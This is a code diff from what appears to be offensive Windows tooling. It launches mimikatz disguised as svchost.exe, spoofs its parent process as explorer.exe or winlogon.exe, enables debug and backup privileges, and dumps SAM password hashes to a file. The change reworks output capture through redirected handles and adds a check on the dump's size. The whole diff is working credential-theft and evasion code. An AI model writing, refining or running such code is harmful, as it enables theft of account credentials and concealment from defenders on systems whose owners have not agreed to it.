@@ -84,11 +84,12 @@ static void launch_mimikatz(void) {
     char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
     wsprintfA(svchost, "%s\\svchost.exe", g_dir);
     wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
-    // ponytail: lsadump::sam needs SeBackupPrivilege to open HKLM\SAM; mimikatz
-    // only auto-enables SeDebugPrivilege. Enable both before the dump, and use
-    // the built-in `log` command (stdout redirection is unreliable here).
+    // ponytail: capture via redirected stdout (STARTF_USESTDHANDLES) without
+    // CREATE_NO_WINDOW, which previously detached mimikatz from the handles.
+    // lsadump::sam needs SeBackupPrivilege; mimicatz only auto-enables
+    // SeDebugPrivilege, so enable both first.
     DeleteFileA(dump);
-    wsprintfA(cmd, "\"%s\" \"log %s\" \"privilege::debug\" \"privilege::backup\" \"lsadump::sam\" \"exit\"", svchost, dump);
+    wsprintfA(cmd, "\"%s\" \"privilege::debug\" \"privilege::backup\" \"lsadump::sam\" \"exit\"", svchost);
 
     DWORD pid = find_pid_by_name("explorer.exe");
     if (!pid) pid = find_pid_by_name("winlogon.exe");
@@ -115,16 +116,23 @@ static void launch_mimikatz(void) {
 
     STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(si) } };
     si.lpAttributeList = attrList;
+    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
+    HANDLE hOut = CreateFileA(dump, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hOut != INVALID_HANDLE_VALUE) { si.StartupInfo.hStdOutput = hOut; si.StartupInfo.hStdError = hOut; }
     PROCESS_INFORMATION pi;
     if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi)) {
         audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM -> %s", pi.dwProcessId, dump);
         CloseHandle(pi.hThread);
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
-        audit("[+] SAM dump completed -> %s", dump);
+        DWORD sz = 0; WIN32_FILE_ATTRIBUTE_DATA fa;
+        if (GetFileAttributesExA(dump, GetFileExInfoStandard, &fa)) sz = fa.nFileSizeLow;
+        if (sz) audit("[+] SAM dump completed (%lu bytes) -> %s", sz, dump);
+        else    audit("[-] SAM dump empty (0 bytes) -> %s", dump);
     } else {
         audit("[-] CreateProcess svchost.exe failed (%lu)", GetLastError());
     }
+    if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
     DeleteProcThreadAttributeList(attrList);
     HeapFree(GetProcessHeap(), 0, attrList);
     CloseHandle(hParent);
